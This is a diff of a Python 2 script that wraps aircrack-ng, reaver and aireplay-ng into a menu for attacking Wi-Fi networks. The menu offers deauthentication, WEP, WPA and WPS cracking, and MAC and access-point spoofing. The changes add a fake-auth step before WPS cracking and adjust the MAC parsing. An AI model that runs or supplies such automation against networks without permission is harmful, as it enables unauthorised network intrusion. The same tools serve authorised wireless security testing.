@@ -160,10 +160,6 @@ if not os.path.exists('/usr/bin/aircrack-ng') and not os.path.exists('/usr/local
 	print "aircrack-ng is not installed."
 	sys.exit(1)
 
-if not os.path.exists('/usr/bin/macchanger'):
-	print "macchanger is not installed."
-	sys.exit(1)
-
 if not os.path.exists('/usr/bin/reaver'):
 	print "reaver is not installed. Please install reaver to use wps cracking"
 
@@ -245,7 +241,8 @@ def WPA_PSK():
    #print wpa.readlines("The wpa password is: ")
 
 def WPS_Crack():
-   print "reaver -i mon1 -b "+bssid+" -c "+channel+" -e "+essid
+   print "reaver -i mon1 -b "+bssid+" -vv"
+   os.system("gnome-terminal -x aireplay-ng mon0 -1 120 -a "+bssid+" -e "+essid+" -h "+station+" --ignore-negative-one")
    os.system("gnome-terminal -x reaver -i mon1 -b "+bssid+" -c "+channel+" -e "+essid)
    
 def aircrack():
@@ -301,7 +298,7 @@ bssid = raw_input("bssid: ")
 essid = raw_input("essid: ")
 channel = raw_input("channel: ")
 macshow = os.popen("macchanger -s mon0")
-station = macshow.read()[15:32]
+station = macshow.read()[13:30]
 
 # starts listening for ivs
 listen()
@@ -309,7 +306,7 @@ listen()
 
 cont = "n"
 while (cont == "n"): 
-	listen_selection = raw_input("\n 0  Change Target\n 1  Fake-auth(FAST)\n 2  ARP Replay\n 3  Deauth Someone\n 4  Frag Attack\n 5  WEP crack\n 6  WPA PSK Crack\n 7  Print Pass\n 8  Deauth like a mofo\n 9  Connect\n 10 WPS Cracking\n 11 Spoof Mac\n 12 Spoof AP\n q  Quit\n\nplease pick a number: ")
+	listen_selection = raw_input("\n 0  Change Target\n 1  Fake-auth(FAST)\n 2  ARP Replay\n 3  Deauth Someone\n 4  Frag Attack\n 5  WEP crack\n 6  WPA PSK Crack\n 7  Print Pass\n 8  Deauth like a mofo\n 9  Connect\n 10 WPS Cracking\n 11 Spoof Mac\n 12 Spoof AP\n 13 Handshake Bookaki\n q  Quit\n\nplease pick a number: ")
 	if listen_selection == "0":
 		scan()
 		# input target prefs
@@ -317,8 +314,7 @@ while (cont == "n"):
 		essid = raw_input("essid: ")
 		channel = raw_input("channel: ")
 		macshow = os.popen("macchanger -s mon0")
-		#Patched for macchanger update
-		station = macshow.read()[15:32]
+		station = macshow.read()[13:30]
 		listen()	
 	elif listen_selection == "1":
 		fakeauth()
